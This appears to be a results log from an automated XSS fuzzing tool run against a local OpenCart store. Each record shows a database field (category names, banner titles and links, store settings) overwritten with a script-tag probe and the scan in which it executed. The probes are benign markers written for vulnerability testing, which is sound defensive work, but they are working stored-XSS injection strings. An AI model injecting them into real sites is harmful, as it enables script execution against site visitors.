            original row: [32, 1, 'Web Cameras', '', 'Web Cameras', '', '']
            fuzzed row: [32, 1, '""\'><script>xss(974110)</script>', '', 'Web Cameras', '', '']
            change: 'Web Cameras' => '""'><script>xss(974110)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_banner_image.title,http://localhost/,976185,"""'><script>xss(976185)</script>","
            opencart.oc_banner_image.title[6][3]
            original row: [91, 8, 1, 'Coca Cola', '', 'catalog/demo/manufacturer/cocacola.png', 0]
            fuzzed row: [91, 8, 1, '""\'><script>xss(976185)</script>', '', 'catalog/demo/manufacturer/cocacola.png', 0]
            change: 'Coca Cola' => '""'><script>xss(976185)</script>'
            
fuzzed after scan 7 / 345
found as XSS in scan 8 / 345"
opencart,oc_banner_image.title,http://localhost/,976222,"""'><script>xss(976222)</script>","
            opencart.oc_banner_image.title[12][3]
            original row: [97, 8, 1, 'Starbucks', '', 'catalog/demo/manufacturer/starbucks.png', 0]
            fuzzed row: [97, 8, 1, '""\'><script>xss(976222)</script>', '', 'catalog/demo/manufacturer/starbucks.png', 0]
            change: 'Starbucks' => '""'><script>xss(976222)</script>'
            
fuzzed after scan 7 / 345
found as XSS in scan 8 / 345"
opencart,oc_setting.value,http://localhost/,978697,"""'><script>xss(978697)</script>","
            opencart.oc_setting.value[7][4]
            original row: [8, 0, 'config', 'config_meta_keyword', '', 0]
            fuzzed row: [8, 0, 'config', 'config_meta_keyword', '""\'><script>xss(978697)</script>', 0]
            change: '' => '""'><script>xss(978697)</script>'
            
fuzzed after scan 120 / 345
found as XSS in scan 121 / 345"
opencart,oc_banner_image.link,http://localhost/,979632,"""'><script>xss(979632)</script>","
            opencart.oc_banner_image.link[12][4]
            original row: [97, 8, 1, 'Starbucks', '', 'catalog/demo/manufacturer/starbucks.png', 0]
            fuzzed row: [97, 8, 1, 'Starbucks', '""\'><script>xss(979632)</script>', 'catalog/demo/manufacturer/starbucks.png', 0]
            change: '' => '""'><script>xss(979632)</script>'
            
fuzzed after scan 8 / 345
found as XSS in scan 9 / 345"
opencart,oc_category_description.name,http://localhost/,980307,"""'><script>xss(980307)</script>","
            opencart.oc_category_description.name[20][2]
            original row: [41, 1, 'test 8', '', 'test 8', '', '']
            fuzzed row: [41, 1, '""\'><script>xss(980307)</script>', '', 'test 8', '', '']
            change: 'test 8' => '""'><script>xss(980307)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_category_description.name,http://localhost/,985072,"""'><script>xss(985072)</script>","
            opencart.oc_category_description.name[35][2]
            original row: [56, 1, 'test 24', '', 'test 24', '', '']
            fuzzed row: [56, 1, '""\'><script>xss(985072)</script>', '', 'test 24', '', '']
            change: 'test 24' => '""'><script>xss(985072)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_banner_image.title,http://localhost/,985200,"""'><script>xss(985200)</script>","
            opencart.oc_banner_image.title[4][3]
            original row: [89, 8, 1, 'Dell', '', 'catalog/demo/manufacturer/dell.png', 0]
            fuzzed row: [89, 8, 1, '""\'><script>xss(985200)</script>', '', 'catalog/demo/manufacturer/dell.png', 0]
            change: 'Dell' => '""'><script>xss(985200)</script>'
            
fuzzed after scan 7 / 345
found as XSS in scan 8 / 345"
opencart,oc_category_description.name,http://localhost/,985341,"""'><script>xss(985341)</script>","
            opencart.oc_category_description.name[3][2]
            original row: [24, 1, 'Phones &amp; PDAs', '', 'Phones &amp; PDAs', '', '']
            fuzzed row: [24, 1, '""\'><script>xss(985341)</script>', '', 'Phones &amp; PDAs', '', '']
            change: 'Phones &amp; PDAs' => '""'><script>xss(985341)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_category_description.name,http://localhost/,987785,"""'><script>xss(987785)</script>","
            opencart.oc_category_description.name[5][2]
            original row: [26, 1, 'PC', '', 'PC', '', '']
            fuzzed row: [26, 1, '""\'><script>xss(987785)</script>', '', 'PC', '', '']
            change: 'PC' => '""'><script>xss(987785)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_category_description.name,http://localhost/,989128,"""'><script>xss(989128)</script>","
            opencart.oc_category_description.name[7][2]
            original row: [28, 1, 'Monitors', '', 'Monitors', '', '']
            fuzzed row: [28, 1, '""\'><script>xss(989128)</script>', '', 'Monitors', '', '']
            change: 'Monitors' => '""'><script>xss(989128)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_setting.value,http://localhost/,990039,"""'><script>xss(990039)</script>","
            opencart.oc_setting.value[92][4]
            original row: [94, 0, 'config', 'config_telephone', '123456789', 0]
            fuzzed row: [94, 0, 'config', 'config_telephone', '""\'><script>xss(990039)</script>', 0]
            change: '123456789' => '""'><script>xss(990039)</script>'
            
fuzzed after scan 121 / 345
found as XSS in scan 122 / 345"
opencart,oc_information_description.title,http://localhost/,990586,"""'><script>xss(990586)</script>","
            opencart.oc_information_description.title[2][2]
            original row: [3, 1, 'Privacy Policy', '&lt;p&gt;\r\n\tPrivacy Policy&lt;/p&gt;\r\n', 'Privacy Policy', '', '']
            fuzzed row: [3, 1, '""\'><script>xss(990586)</script>', '&lt;p&gt;\r\n\tPrivacy Policy&lt;/p&gt;\r\n', 'Privacy Policy', '', '']
            change: 'Privacy Policy' => '""'><script>xss(990586)</script>'
            
fuzzed after scan 58 / 345
found as XSS in scan 59 / 345"
opencart,oc_category_description.name,http://localhost/,991406,"""'><script>xss(991406)</script>","
            opencart.oc_category_description.name[30][2]
            original row: [51, 1, 'test 19', '', 'test 19', '', '']
            fuzzed row: [51, 1, '""\'><script>xss(991406)</script>', '', 'test 19', '', '']
            change: 'test 19' => '""'><script>xss(991406)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_category_description.name,http://localhost/,992788,"""'><script>xss(992788)</script>","
            opencart.oc_category_description.name[26][2]
            original row: [47, 1, 'test 15', '', 'test 15', '', '']
            fuzzed row: [47, 1, '""\'><script>xss(992788)</script>', '', 'test 15', '', '']
            change: 'test 15' => '""'><script>xss(992788)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_banner_image.title,http://localhost/,993284,"""'><script>xss(993284)</script>","
            opencart.oc_banner_image.title[3][3]
            original row: [88, 8, 1, 'Harley Davidson', '', 'catalog/demo/manufacturer/harley.png', 0]
            fuzzed row: [88, 8, 1, '""\'><script>xss(993284)</script>', '', 'catalog/demo/manufacturer/harley.png', 0]
            change: 'Harley Davidson' => '""'><script>xss(993284)</script>'
            
fuzzed after scan 7 / 345
found as XSS in scan 8 / 345"
opencart,oc_setting.value,http://localhost/,995769,"""'><script>xss(995769)</script>","
            opencart.oc_setting.value[6][4]
            original row: [7, 0, 'config', 'config_meta_description', 'My Store', 0]
            fuzzed row: [7, 0, 'config', 'config_meta_description', '""\'><script>xss(995769)</script>', 0]
            change: 'My Store' => '""'><script>xss(995769)</script>'
            
fuzzed after scan 120 / 345
found as XSS in scan 121 / 345"
opencart,oc_banner_image.link,http://localhost/,998146,"""'><script>xss(998146)</script>","
            opencart.oc_banner_image.link[8][4]
            original row: [93, 8, 1, 'Canon', '', 'catalog/demo/manufacturer/canon.png', 0]
            fuzzed row: [93, 8, 1, 'Canon', '""\'><script>xss(998146)</script>', 'catalog/demo/manufacturer/canon.png', 0]
            change: '' => '""'><script>xss(998146)</script>'
            
fuzzed after scan 8 / 345
found as XSS in scan 9 / 345"
